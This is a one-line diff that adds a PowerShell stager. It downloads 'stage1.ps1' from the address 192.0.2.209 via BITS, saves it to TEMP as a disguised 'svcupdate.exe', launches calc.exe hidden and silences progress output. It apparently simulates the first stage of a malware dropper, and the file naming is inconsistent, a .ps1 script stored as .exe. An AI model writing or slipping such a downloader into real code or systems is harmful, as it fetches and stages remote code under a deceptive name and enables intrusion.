@@ -1,0 +1,1 @@
+$Stage1Url = 'http://192.0.2.209:80/stage1.ps1'; $LocalPath = "$env:TEMP\svcupdate.exe"; $StageTimeout = 46; Start-BitsTransfer -Source $Stage1Url -Destination $LocalPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $ProgressPreference = "SilentlyContinue"; Set-Location -Path $env:TEMP
